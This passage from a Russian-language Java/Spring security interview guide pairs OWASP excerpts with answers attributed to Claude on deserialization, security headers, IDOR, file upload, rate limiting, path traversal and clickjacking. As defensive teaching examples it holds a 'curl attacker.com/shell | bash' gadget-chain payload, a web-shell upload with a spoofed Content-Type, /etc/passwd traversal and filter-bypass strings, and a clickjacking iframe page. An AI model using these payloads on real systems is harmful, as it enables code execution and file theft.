xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
// Затем XMLStreamReader передаётся JAXB Unmarshaller-у
JAXBContext context = JAXBContext.newInstance(MyClass.class);
Unmarshaller unmarshaller = context.createUnmarshaller();
XMLStreamReader xsr = xif.createXMLStreamReader(inputStream);
MyClass obj = (MyClass) unmarshaller.unmarshal(xsr);
```

**Расхождение между источниками:** OWASP рекомендует полный запрет DTD как предпочтительный вариант. Однако в ряде легаси-систем DTD используется для валидации документов — в этом случае допускается частичное отключение (только external entities). Spring/Jakarta EE-приложения могут дополнительно использовать `StaxSource` и Spring `XmlBeansMarshaller` — для них также следует настроить ограничения аналогичным образом.

---

### Вопрос 53. Что такое небезопасная десериализация в Java? Объясните механизм атаки, как распознать уязвимый трафик по magic bytes и какие меры защиты рекомендует OWASP.

**Категория:** Безопасность · **Уровень:** Senior

#### Оригинальный ответ из интернета
> Источник: [Deserialization Cheat Sheet — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)

Десериализация — это процесс преобразования структурированных данных обратно в объект. Java-десериализатор может быть «перепрофилирован» для вредоносных целей при работе с недоверенными данными.

Последствия небезопасной десериализации:
- Удалённое выполнение кода (RCE)
- Denial of Service
- Обход контроля доступа

**Magic bytes Java-сериализации:**
- Hex: `AC ED 00 05`
- Base64: `rO0`

Наличие этих байт в принимаемых данных — признак Java-сериализованного потока.

**Основной метод защиты** — переопределить `ObjectInputStream.resolveClass()` для реализации allowlist классов:

```java
protected Class<?> resolveClass(ObjectStreamClass desc)
    throws IOException {
    if (!desc.getName().equals(AllowedClass.class.getName())) {
        throw new InvalidClassException("Unauthorized deserialization attempt");
    }
    return super.resolveClass(desc);
}
```

OWASP также рекомендует использовать `ValidatingObjectInputStream` из Apache Commons IO или библиотеку SerialKiller. Чувствительные поля следует объявлять `private transient`. Альтернатива — переход на JSON/XML вместо нативного Java-формата.

Опасные API: `XMLDecoder`, `XStream`, `ObjectInputStream.readObject()`, `Serializable`.

#### Ответ от Claude

**Что такое небезопасная десериализация**

Java-сериализация (`java.io.Serializable`) позволяет преобразовать объект в байтовый поток и восстановить его обратно. Процесс восстановления (десериализация через `ObjectInputStream.readObject()`) опасен: при создании объекта из байтов JVM выполняет методы `readObject()`, `readResolve()` и другие магические методы на классах, присутствующих в classpath, — **до** того как приложение может проверить тип объекта.

**Механизм атаки: Gadget Chains**

В Java-приложениях, особенно использующих крупные зависимости (Apache Commons Collections, Spring, Hibernate), classpath содержит сотни классов. Среди них находятся «гаджеты» — классы, чьи методы при вызове в определённом порядке формируют цепочку, приводящую к RCE.

Атакующий создаёт специальный сериализованный объект (не используемый самим приложением, но присутствующий в classpath), десериализация которого запускает `Runtime.exec(...)` или аналогичный вызов. Инструменты типа `ysoserial` генерируют готовые payload'ы для известных гаджет-цепочек.

```
Атакующий → сериализованный payload → ObjectInputStream.readObject()
→ DispatchingObjectInputStream.resolveClass() (не переопределён)
→ CommonsBeanutils.readObject() → PropertyUtils.setProperty()
→ ... цепочка вызовов ... → Runtime.exec("curl attacker.com/shell | bash")
```

**Как распознать уязвимый трафик**

Java-сериализованный поток всегда начинается с сигнатуры:
- Hex: `AC ED 00 05` (первые 4 байта)
- В Base64-кодировании: строка начинается с `rO0`

Если приложение принимает данные в этом формате через API, JMS, RMI, HTTP-параметры — оно потенциально уязвимо.

**Защита:**

**1. Allowlist через переопределение `resolveClass`:**
```java
public class SafeObjectInputStream extends ObjectInputStream {

    private static final Set<String> ALLOWED_CLASSES = Set.of(
        "com.example.MyDataClass",
        "java.util.ArrayList",
        "java.lang.String"
    );

    public SafeObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException(
                "Unauthorized deserialization: " + desc.getName());
        }
        return super.resolveClass(desc);
    }
}
```

**2. `ValidatingObjectInputStream` (Apache Commons IO):**
```java
// Принимает только явно разрешённые классы
try (ValidatingObjectInputStream vois =
        new ValidatingObjectInputStream(inputStream)) {
    vois.accept(MyDataClass.class, ArrayList.class, String.class);
    MyDataClass obj = (MyDataClass) vois.readObject();
}
```

**3. Java Serialization Filter (JEP 290, Java 9+):**
```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.*;java.util.*;!*");   // разрешить example и java.util, запретить всё остальное
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(filter);
```

**4. Отказ от нативной Java-сериализации** — предпочтительный подход: использовать JSON (Jackson, Gson) или Protocol Buffers. Jackson по умолчанию безопасен при использовании без `enableDefaultTyping()`.

**5. Agent-based защита** (`-javaagent:rO0-agent.jar`, `-javaagent:SerialKiller.jar`) — перехватывает десериализацию на уровне JVM.

**Расхождение между источниками:** OWASP Deserialization Cheat Sheet ставит на первое место allowlist через `resolveClass`. Официальные Java-релизы (JEP 290) предлагают `ObjectInputFilter` как более современный механизм с поддержкой на уровне JVM. Оба подхода совместимы; при возможности предпочтительнее отказ от Java-сериализации в пользу JSON.

---

### Вопрос 54. Какие HTTP Security Headers выставляет Spring Security по умолчанию и как настроить HSTS, X-Frame-Options и Content-Security-Policy через HttpSecurity.headers()?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [Security HTTP Response Headers — Spring Security Reference (docs.spring.io)](https://docs.spring.io/spring-security/reference/servlet/exploits/headers.html)

Spring Security автоматически добавляет следующие заголовки безопасности ко всем ответам:

```
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
X-Content-Type-Options: nosniff
Strict-Transport-Security: max-age=31536000 ; includeSubDomains
X-Frame-Options: DENY
X-XSS-Protection: 0
```

`Strict-Transport-Security` добавляется только для HTTPS-запросов. `X-XSS-Protection: 0` намеренно отключает встроенные XSS-фильтры браузера — они устарели и сами могут создавать уязвимости.

Настройка заголовков через `HttpSecurity.headers()`:

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .httpStrictTransportSecurity(hsts -> hsts
            .includeSubDomains(true)
            .preload(true)
            .maxAgeInSeconds(31536000)
        )
        .frameOptions(fo -> fo.sameOrigin())
        .contentSecurityPolicy(csp -> csp
            .policyDirectives("script-src 'self' https://trustedscripts.example.com")
        )
    );
    return http.build();
}
```

#### Ответ от Claude

**Заголовки, выставляемые Spring Security по умолчанию**

`HeaderWriterFilter` — фильтр из цепочки Spring Security, добавляющий security headers к каждому ответу. Заголовки по умолчанию:

| Заголовок | Значение по умолчанию | Что защищает |
|-----------|----------------------|--------------|
| `Cache-Control` | `no-cache, no-store, max-age=0, must-revalidate` | Предотвращает кэширование чувствительных данных |
| `X-Content-Type-Options` | `nosniff` | Запрещает MIME-sniffing браузером |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Принудительное HTTPS (только для HTTPS-запросов) |
| `X-Frame-Options` | `DENY` | Защита от Clickjacking |
| `X-XSS-Protection` | `0` | Отключает устаревший встроенный XSS-фильтр браузера |

**HSTS (HTTP Strict Transport Security)**

Заголовок указывает браузеру всегда использовать HTTPS для данного домена в течение указанного времени. Это защищает от MITM-атак при downgrade до HTTP.

```java
http.headers(headers -> headers
    .httpStrictTransportSecurity(hsts -> hsts
        .maxAgeInSeconds(31536000)    // 1 год
        .includeSubDomains(true)      // применять к поддоменам
        .preload(true)                // включить в HSTS Preload List браузеров
    )
);
```

**X-Frame-Options**

Защищает от Clickjacking — атаки, при которой страница встраивается в `<iframe>` злоумышленника:

```java
http.headers(headers -> headers
    .frameOptions(fo -> fo.deny())       // полный запрет встраивания
    // или
    .frameOptions(fo -> fo.sameOrigin()) // разрешить только с того же origin
);
```

**X-Content-Type-Options: nosniff**

Запрещает браузеру «угадывать» MIME-тип ответа (MIME sniffing). Включён по умолчанию. Можно отключить:
```java
http.headers(headers -> headers
    .contentTypeOptions(ct -> ct.disable()) // отключить (не рекомендуется)
);
```

**Content-Security-Policy**

CSP — не добавляется Spring Security автоматически, требует явной конфигурации:

```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp
        .policyDirectives(
            "default-src 'self'; " +
            "script-src 'self' https://cdn.example.com; " +
            "style-src 'self' 'unsafe-inline'; " +
            "object-src 'none'; " +
            "report-uri /csp-report"
        )
    )
);
```

Report-only режим (логировать нарушения без блокировки — удобно при внедрении CSP):
```java
csp.policyDirectives("default-src 'self'").reportOnly()
```

**Полная конфигурация безопасных заголовков:**

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .httpStrictTransportSecurity(hsts -> hsts
            .maxAgeInSeconds(31536000).includeSubDomains(true))
        .frameOptions(fo -> fo.deny())
        .contentSecurityPolicy(csp -> csp
            .policyDirectives("default-src 'self'; object-src 'none'"))
        .referrerPolicy(rp -> rp
            .policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
        .permissionsPolicy(pp -> pp
            .policy("geolocation=(), camera=(), microphone=()"))
    );
    return http.build();
}
```

**Расхождений между источниками не обнаружено.** OWASP HTTP Headers Cheat Sheet и официальная документация Spring Security согласованы в рекомендуемых значениях. Исключение: `X-XSS-Protection` — OWASP рекомендует `0` (отключить), что Spring Security делает по умолчанию с версии 5.4, поскольку устаревший браузерный XSS-фильтр может сам создавать уязвимости.

---

### Вопрос 55. Что такое IDOR (Insecure Direct Object Reference)? Приведи пример уязвимого Spring-контроллера и покажи, как правильно защитить ресурс от несанкционированного доступа.

**Категория:** Безопасность · **Уровень:** Junior

#### Оригинальный ответ из интернета
> Источник: [Insecure Direct Object Reference Prevention Cheat Sheet — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)

IDOR (Insecure Direct Object Reference) — уязвимость, возникающая когда атакующие могут получать доступ или изменять объекты, манипулируя идентификаторами без должной проверки прав доступа.

**Пример атаки в URL:** Пользователь видит `https://example.org/users/123`. Злоумышленник меняет число на 124 и получает доступ к чужому профилю.

**Три способа защиты:**

1. **Обязательная проверка прав**: Контролировать доступ при каждом запросе к данным — не только проверять аутентификацию, но и авторизацию к конкретному объекту.

2. **Использовать сессию вместо параметров**: Определять текущего пользователя из информации сессии/токена, а не из URL/POST:
   - Вместо: `project = Project.findById(params.id)`
   - Использовать: `project = currentUser.getProjects().findById(params.id)` — фильтрация по текущему пользователю.

3. **Сложные идентификаторы**: UUID или случайные строки вместо последовательных чисел снижают угрозу, но не заменяют проверку прав доступа.

Главное правило: никогда не полагайтесь только на сложность ID без проверки разрешений.

#### Ответ от Claude

**Что такое IDOR**

IDOR — тип уязвимости нарушения контроля доступа (Broken Access Control, A01 в OWASP Top 10:2021). Возникает, когда приложение использует идентификатор объекта (числовой ID, имя файла, ключ) из пользовательского ввода для прямого доступа к данным без проверки, имеет ли текущий пользователь право на этот объект.

**Уязвимый пример:**

```java
@GetMapping("/orders/{id}")
public ResponseEntity<Order> getOrder(@PathVariable Long id) {
    // УЯЗВИМО: запрашивает любой заказ по ID из URL
    // Авторизованный пользователь A может запросить заказ пользователя B,
    // просто подобрав id=100, id=101, id=102...
    return orderRepository.findById(id)
        .map(ResponseEntity::ok)
        .orElse(ResponseEntity.notFound().build());
}
```

Пользователь с `id=200` запрашивает `GET /orders/201` — видит заказ другого пользователя.

**Безопасный пример — фильтрация по текущему пользователю:**

```java
@GetMapping("/orders/{id}")
public ResponseEntity<Order> getOrder(
        @PathVariable Long id,
        @AuthenticationPrincipal UserDetails currentUser) {

    // БЕЗОПАСНО: ищем заказ только среди заказов текущего пользователя
    return orderRepository.findByIdAndUsername(id, currentUser.getUsername())
        .map(ResponseEntity::ok)
        .orElse(ResponseEntity.notFound().build()); // 404, а не 403 — не раскрываем факт существования
}
```

```java
// Repository
public interface OrderRepository extends JpaRepository<Order, Long> {
    Optional<Order> findByIdAndUsername(Long id, String username);
}
```

**Безопасный пример — проверка через @PreAuthorize + SpEL:**

```java
@GetMapping("/orders/{id}")
@PreAuthorize("@orderSecurityService.isOwner(#id, authentication.name)")
public ResponseEntity<Order> getOrder(@PathVariable Long id) {
    return orderRepository.findById(id)
        .map(ResponseEntity::ok)
        .orElse(ResponseEntity.notFound().build());
}

@Service("orderSecurityService")
public class OrderSecurityService {
    public boolean isOwner(Long orderId, String username) {
        return orderRepository.existsByIdAndUsername(orderId, username);
    }
}
```

**Почему UUID не решает проблему**

Замена числового ID на UUID (`/orders/a1b2c3d4-...`) снижает вероятность угадывания, но не устраняет уязвимость: если атакующий получил UUID (через XSS, логи, ссылку в письме, утечку), он может получить доступ к чужим данным. UUID — дополнительная мера, а не замена проверки авторизации.

**Правильный HTTP-статус при IDOR**

Возвращать `404 Not Found` вместо `403 Forbidden` при чужом ресурсе. Это не раскрывает факт существования объекта атакующему (иначе атакующий методом перебора может определить, какие ID существуют).

**Расхождений между источниками не обнаружено.** OWASP и Spring Security документация согласованно рекомендуют проверку на уровне данных (scope запросов к БД по владельцу) и/или метод-уровневую авторизацию через `@PreAuthorize`.

---

### Вопрос 56. Какие угрозы несёт небезопасная загрузка файлов в Java-приложение? Что нужно проверять при приёме файла и почему нельзя полагаться на Content-Type из запроса?

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [File Upload Cheat Sheet — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

Загруженные файлы могут содержать эксплойты для парсеров, использоваться для фишинга, быть бомбами (ZIP, XML), перезаписывать системные файлы или содержать XSS/CSRF-код.

**Content-Type из запроса — это заголовок от пользователя и легко подделывается.** Не следует полагаться на него как на основную защиту — только как дополнительную проверку.

**Валидации, которые нужно выполнять:**
- **Расширения**: использовать allowlist разрешённых расширений вместо дёнислиста. Остерегаться двойных расширений (`.jpg.php`), null-байтов и слабых регулярных выражений.
- **Сигнатуры файлов (magic numbers)**: проверять реальный тип файла по первым байтам в дополнение к Content-Type.
- **Размер**: проверять до и после распаковки архивов (zip-bomb защита).

**Хранение**: сохранять файлы вне веб-корня. Генерировать UUID/GUID вместо сохранения исходных имён файлов. Применять принцип наименьших привилегий на директорию хранения.

#### Ответ от Claude

**Основные угрозы при загрузке файлов**

| Угроза | Описание |
|--------|----------|
| RCE через веб-шелл | Атакующий загружает `.php`/`.jsp` файл, если он хранится в webroot и доступен по HTTP |
| Path Traversal при сохранении | Имя файла `../../etc/cron.d/backdoor` перезаписывает системный файл |
| Малвар/XSS-payload | SVG-файл с embedded JavaScript; HTML-файл с CSRF-формой |
| ZIP-бомба | Архив, раскрывающийся в несколько гигабайт, вызывает OOM или переполнение диска |
| XXE в Office-файлах | Документ DOCX/XLSX — это ZIP с XML внутри; уязвимый парсер читает external entities |

**Почему Content-Type нельзя доверять**

HTTP заголовок `Content-Type` формирует клиент (браузер или атакующий). С помощью Burp Suite, curl или Python-скрипта любое значение Content-Type можно подделать:

```bash
# Загружаем shell.php с поддельным Content-Type image/jpeg
curl -F "file=@shell.php;type=image/jpeg" https://example.com/upload
```

**Правильная валидация:**

```java
@PostMapping("/upload")
public ResponseEntity<String> upload(@RequestParam("file") MultipartFile file)
        throws IOException {

    // 1. Проверка размера (до парсинга)
    if (file.getSize() > 5 * 1024 * 1024) { // 5 MB
        return ResponseEntity.badRequest().body("File too large");
    }

    // 2. Allowlist расширений
    String originalName = file.getOriginalFilename();
    String extension = FilenameUtils.getExtension(originalName).toLowerCase();
    Set<String> allowed = Set.of("jpg", "jpeg", "png", "gif", "pdf");
    if (!allowed.contains(extension)) {
        return ResponseEntity.badRequest().body("File type not allowed");
    }

    // 3. Проверка по magic bytes (Apache Tika)
    Tika tika = new Tika();
    String detectedType = tika.detect(file.getInputStream());
    if (!detectedType.startsWith("image/") && !detectedType.equals("application/pdf")) {
        return ResponseEntity.badRequest().body("Content mismatch");
    }

    // 4. Безопасное имя файла (UUID, без оригинального имени)
    String storedName = UUID.randomUUID() + "." + extension;

    // 5. Сохранение ВНЕ webroot
    Path uploadDir = Paths.get("/var/app-data/uploads"); // не в static/!
    Path targetPath = uploadDir.resolve(storedName).normalize();

    // 6. Проверка на path traversal
    if (!targetPath.startsWith(uploadDir)) {
        return ResponseEntity.badRequest().body("Invalid path");
    }

    Files.copy(file.getInputStream(), targetPath, StandardCopyOption.REPLACE_EXISTING);
    return ResponseEntity.ok("Uploaded: " + storedName);
}
```

**Ключевые правила:**

- **Хранить вне webroot** — файлы в `/var/app-data/uploads/` недоступны по HTTP напрямую. Для отдачи использовать контроллер, который проверяет авторизацию.
- **UUID вместо оригинального имени** — исключает path traversal через имя файла и перезапись существующих файлов.
- **Apache Tika** — библиотека для определения MIME-типа по реальному содержимому файла (анализ magic bytes, структуры).
- **Ограничение размера в Spring Boot**: `spring.servlet.multipart.max-file-size=5MB`.

**Расхождений между источниками не обнаружено.** OWASP File Upload Cheat Sheet и практические гайды согласованно рекомендуют allowlist расширений + проверку magic bytes + хранение вне webroot + генерацию UUID-имён.

---

### Вопрос 57. Что такое rate limiting и как реализовать его в Spring Boot с помощью Bucket4j? Объясните алгоритм Token Bucket и чем он отличается от Fixed Window.

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [Rate Limiting With Spring Boot And Bucket4j — Baeldung](https://www.baeldung.com/spring-bucket4j)

Rate limiting — это стратегия контроля доступа к API: система отслеживает число запросов от клиента за период и возвращает HTTP 429 при превышении лимита.

**Алгоритм Token Bucket**, на котором основан Bucket4j: бакет имеет фиксированную ёмкость (количество токенов). Каждый запрос потребляет один токен. Если токены закончились — запрос отклоняется. Токены восполняются с фиксированной скоростью, не превышая ёмкость бакета.

Интеграция через Spring MVC `HandlerInterceptor`:

```java
public class RateLimitInterceptor implements HandlerInterceptor {
    @Override
    public boolean preHandle(HttpServletRequest request,
                             HttpServletResponse response, Object handler) {
        Bucket bucket = pricingPlanService.resolveBucket(apiKey);
        ConsumptionProbe probe = bucket.tryConsumeAndReturnRemaining(1);

        if (!probe.isConsumed()) {
            response.sendError(HttpStatus.TOO_MANY_REQUESTS.value()); // 429
            return false;
        }
        return true;
    }
}
```

Основные классы: `Bucket`, `Bandwidth`, `Refill`, `ConsumptionProbe`.

#### Ответ от Claude

**Что такое Rate Limiting**

Rate limiting — ограничение числа запросов от одного клиента (по IP, API-ключу, userId) за единицу времени. Защищает от:
- Brute-force атак на аутентификацию
- DDoS (application layer)
- Scraping и злоупотребления API
- Credential stuffing (перебор украденных учётных данных)

**Алгоритм Fixed Window (наивный подход)**

Счётчик сбрасывается раз в фиксированный период (например, каждую минуту). Проблема: атакующий может выполнить 200 запросов в конце одного окна и 200 в начале следующего — 400 запросов за несколько секунд при лимите 200/мин.

**Алгоритм Token Bucket (Bucket4j)**

Бакет с ёмкостью N токенов. Каждый запрос потребляет 1 токен. Токены непрерывно восполняются со скоростью R/сек. Если токенов нет — запрос отклоняется немедленно. Позволяет краткосрочные всплески (burst) до размера бакета, при этом ограничивая долгосрочную среднюю нагрузку.

**Реализация с Bucket4j:**

```xml
<dependency>
    <groupId>com.bucket4j</groupId>
    <artifactId>bucket4j-core</artifactId>
    <version>8.15.0</version>
</dependency>
```

```java
// Создание бакета: 20 запросов, восполнение 20 токенов каждую минуту
Bandwidth limit = Bandwidth.classic(
    20,                                // ёмкость
    Refill.greedy(20, Duration.ofMinutes(1)) // восполнение
);
Bucket bucket = Bucket.builder().addLimit(limit).build();

// Попытка потребить токен
if (bucket.tryConsume(1)) {
    // выполнить запрос
} else {
    // вернуть HTTP 429 Too Many Requests
}
```

**Spring Boot Interceptor — централизованный rate limit:**

```java
@Component
public class RateLimitInterceptor implements HandlerInterceptor {

    // Бакет на каждый IP (в продакшне — кэш: Redis + Bucket4j Spring starter)
    private final Map<String, Bucket> buckets = new ConcurrentHashMap<>();

    private Bucket resolveBucket(String clientIp) {
        return buckets.computeIfAbsent(clientIp, k ->
            Bucket.builder()
                .addLimit(Bandwidth.classic(100, Refill.greedy(100, Duration.ofMinutes(1))))
                .build()
        );
    }

    @Override
    public boolean preHandle(HttpServletRequest request,
                             HttpServletResponse response,
                             Object handler) throws Exception {
        String clientIp = request.getRemoteAddr();
        Bucket bucket = resolveBucket(clientIp);
        ConsumptionProbe probe = bucket.tryConsumeAndReturnRemaining(1);

        if (probe.isConsumed()) {
            response.setHeader("X-Rate-Limit-Remaining",
                String.valueOf(probe.getRemainingTokens()));
            return true;
        }

        long waitSeconds = probe.getNanosToWaitForRefill() / 1_000_000_000;
        response.setHeader("Retry-After", String.valueOf(waitSeconds));
        response.sendError(HttpStatus.TOO_MANY_REQUESTS.value(),
            "Too Many Requests");
        return false;
    }
}
```

**Регистрация interceptor:**
```java
@Configuration
public class WebMvcConfig implements WebMvcConfigurer {
    @Autowired
    private RateLimitInterceptor rateLimitInterceptor;

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(rateLimitInterceptor)
            .addPathPatterns("/api/**");
    }
}
```

**Production-ready: Bucket4j + Redis**

Локальная `ConcurrentHashMap` работает только для одного инстанса. В кластере бакеты должны храниться в Redis:

```yaml
# Declarative config (bucket4j-spring-boot-starter)
bucket4j:
  enabled: true
  filters:
    - cache-name: rate-limit-buckets
      url: /api/.*
      rate-limits:
        - cache-key: "getHeader('X-API-Key')"
          bandwidths:
            - capacity: 100
              time: 1
              unit: hours
```

**Расхождений между источниками не обнаружено.** Baeldung и официальная документация Bucket4j согласованно рекомендуют `HandlerInterceptor` для простых сценариев и Redis-интеграцию для кластеров.

---

### Вопрос 58. Что такое атака Path Traversal (Directory Traversal)? Покажите уязвимый Java-код, объясните технику обхода фильтров и как правильно защититься через канонизацию пути.

**Категория:** Безопасность · **Уровень:** Middle

#### Оригинальный ответ из интернета
> Источник: [Path Traversal — OWASP Foundation](https://owasp.org/www-community/attacks/Path_Traversal)

Path traversal (также известна как Directory Traversal) — атака, целью которой является доступ к файлам и директориям, находящимся вне веб-корня (web root) приложения. Атака использует последовательности `../` и их вариации.

Пример атаки: `http://site.com/get-files?file=../../../../etc/passwd`

**Методы защиты:**
- Использовать `normalize()` перед файловыми операциями
- Использовать индексы вместо реальных частей имён файлов
- Валидировать ввод, принимая только известные допустимые значения (allowlist)
- Исключать пользовательский ввод из путей файлов

> Дополнительный источник: [What is path traversal, and how to prevent it? — PortSwigger Web Security Academy](https://portswigger.net/web-security/file-path-traversal)

Атакующий может использовать `../` для перемещения вверх по файловой иерархии. Существуют техники обхода простых фильтров:
- Абсолютные пути: `/etc/passwd` вместо traversal-последовательностей
- Вложенные последовательности: `....//` или `....\/` для обхода фильтров, удаляющих `../`
- URL-кодирование: `%2e%2e%2f` или двойное кодирование `%252e%252e%252f`
- Null-байт инъекция: `filename.jpg%00.png` для обрезания ожидаемого расширения

Рекомендованная защита в Java:
```java
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // process file
}
```

#### Ответ от Claude

**Что такое Path Traversal**

Path Traversal — атака, при которой атакующий использует последовательности `../` (или их эквиваленты) в пользовательском вводе, который затем используется для формирования пути к файлу. Цель — выйти за пределы разрешённой директории и прочитать (или перезаписать) произвольный файл на сервере.

**Уязвимый Java-код:**

```java
// УЯЗВИМО: конкатенация пользовательского ввода в путь
@GetMapping("/files")
public ResponseEntity<Resource> downloadFile(@RequestParam String filename)
        throws IOException {
    Path filePath = Paths.get("/app/uploads/" + filename);
    Resource resource = new FileSystemResource(filePath.toFile());
    return ResponseEntity.ok()
        .header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=" + filename)
        .body(resource);
}
// Атака: filename=../../../../etc/passwd
// Итоговый путь: /app/uploads/../../../../etc/passwd → /etc/passwd
```

**Техники обхода простых фильтров**

| Техника | Пример | Против какой защиты |
|---------|--------|---------------------|
| URL-encoding | `%2e%2e%2f` = `../` | Фильтр, проверяющий `../` как строку |
| Двойное encoding | `%252e%252e%252f` | Серверы, декодирующие URL дважды |
| Вложенные последовательности | `....//` | Фильтр, удаляющий `../` один раз |
| Абсолютный путь | `/etc/passwd` | Фильтр `../`, но не `/` |
| Null-байт | `secret.txt%00.jpg` | Фильтр суффикса (если сервер обрезает по null-байту) |
| Смешанные разделители | `..\//` | Фильтр только unix-путей |

**Правильная защита через канонизацию:**

```java
private static final Path BASE_DIR = Paths.get("/app/uploads").toAbsolutePath().normalize();

@GetMapping("/files")
public ResponseEntity<Resource> downloadFile(@RequestParam String filename)
        throws IOException {

    // 1. Канонизация: разворачивает ../, символические ссылки, нормализует разделители
    Path requestedPath = BASE_DIR.resolve(filename).normalize().toAbsolutePath();

    // 2. Проверка: путь должен быть ВНУТРИ разрешённой директории
    if (!requestedPath.startsWith(BASE_DIR)) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
    }

    // 3. Дополнительно: allowlist для имён файлов
    String name = requestedPath.getFileName().toString();
    if (!name.matches("[a-zA-Z0-9._-]+")) {
        return ResponseEntity.badRequest().build();
    }

    // 4. Проверка существования файла
    if (!Files.exists(requestedPath) || Files.isDirectory(requestedPath)) {
        return ResponseEntity.notFound().build();
    }

    Resource resource = new FileSystemResource(requestedPath.toFile());
    return ResponseEntity.ok().body(resource);
}
```

`Path.normalize()` разворачивает `..` и `.` компоненты пути. `startsWith(BASE_DIR)` гарантирует, что финальный путь находится внутри разрешённой директории — даже после всех техник обхода.

**Дополнительная защита:**

Использовать allowlist вместо пути вообще: хранить маппинг `key → real_path` на сервере, а клиенту передавать только ключ:
```java
Map<String, Path> FILES = Map.of(
    "report2024", Paths.get("/app/uploads/annual_report_2024.pdf"),
    "manual", Paths.get("/app/uploads/user_manual_v3.pdf")
);
Path filePath = FILES.get(userKey); // если null — 404, traversal невозможен
```

**Расхождений между источниками не обнаружено.** OWASP и PortSwigger Web Security Academy согласованно рекомендуют канонизацию через `getCanonicalPath()`/`normalize()` + `startsWith()` как основной механизм защиты.

---

### Вопрос 59. Что такое Clickjacking? Чем `X-Frame-Options: DENY` отличается от CSP `frame-ancestors 'none'`? Какой из них предпочтителен в современных браузерах и почему?

**Категория:** Безопасность · **Уровень:** Junior

#### Оригинальный ответ из интернета
> Источник: [Clickjacking Defense Cheat Sheet — OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)

Clickjacking (UI redress атака) — атака, когда злоумышленник встраивает целевую страницу в `<iframe>` и перенаправляет клики пользователя на скрытые элементы.

**Два основных механизма защиты:**

`X-Frame-Options` — HTTP-заголовок с тремя значениями:
- `DENY` — запрещает встраивание в любые фреймы
- `SAMEORIGIN` — разрешает только с того же origin
- `ALLOW-FROM uri` — **устарел** и не работает в современных браузерах

`Content-Security-Policy: frame-ancestors` — современная альтернатива:
- `frame-ancestors 'none'` — полный запрет
- `frame-ancestors 'self'` — только собственный домен
- `frame-ancestors 'self' *.example.com` — несколько доменов

Критическая ошибка: попытка использовать `<meta http-equiv="X-Frame-Options">` не работает — заголовок должен быть в HTTP-ответе.

JavaScript-методы защиты (frame-busting) ненадёжны и легко обходятся через `sandbox` атрибут iframe.

#### Ответ от Claude

**Что такое Clickjacking**

Clickjacking (UI Redressing) — атака, при которой злоумышленник размещает прозрачный `<iframe>` с целевой страницей поверх собственного сайта. Пользователь думает, что кликает по элементам сайта злоумышленника, но фактически взаимодействует с невидимой страницей в iframe (кнопка «Лайк», «Подтвердить перевод», «Разрешить доступ к камере»).

```html
<!-- Атака: пользователь видит кнопку "WIN FREE IPHONE" -->
<!-- Фактически кликает по скрытой кнопке "Разрешить" банковского сайта -->
<style>
  iframe { opacity: 0.01; position: absolute; z-index: 9999; }
</style>
<button>WIN FREE IPHONE!</button>
<iframe src="https://bank.example.com/transfer?to=attacker&amount=1000"></iframe>
```

**X-Frame-Options vs CSP frame-ancestors**

| Характеристика | X-Frame-Options | CSP frame-ancestors |
|----------------|-----------------|---------------------|
| Введён | 2008 (нестандартный) | 2012 (уровень CSP Level 2) |
| Стандарт | Нет официального RFC | W3C CSP спецификация |
| Поддержка нескольких доменов | Нет (только один `ALLOW-FROM`) | Да (`'self' *.trusted.com cdn.com`) |
| `ALLOW-FROM` в современных браузерах | Устарел, не поддерживается | Не применимо |
| Приоритет при совместном использовании | Ниже | Выше (переопределяет X-Frame-Options) |
| Совместимость | Поддерживается всеми браузерами | IE11 не поддерживает |

**Почему CSP frame-ancestors предпочтительнее:**

1. Гибкость: позволяет задать несколько источников (`'self' https://partner.com`)
2. Стандартизация: часть W3C CSP Level 2
3. Будущее: `X-Frame-Options: ALLOW-FROM` deprecated во всех современных браузерах
4. Приоритет: когда указаны оба, браузер игнорирует `X-Frame-Options` в пользу CSP

**Рекомендация по совместному использованию:**

```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

Указать оба — для максимальной совместимости: CSP для современных браузеров, X-Frame-Options для IE11.

**Настройка в Spring Security:**

```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        // X-Frame-Options
        .frameOptions(fo -> fo.deny())
        // CSP с frame-ancestors
        .contentSecurityPolicy(csp -> csp
            .policyDirectives("default-src 'self'; frame-ancestors 'none'")
        )
    );
    return http.build();
}
```

**Почему JavaScript frame-busting не работает**

Устаревший подход `if (top != self) { top.location = self.location; }` обходится через:
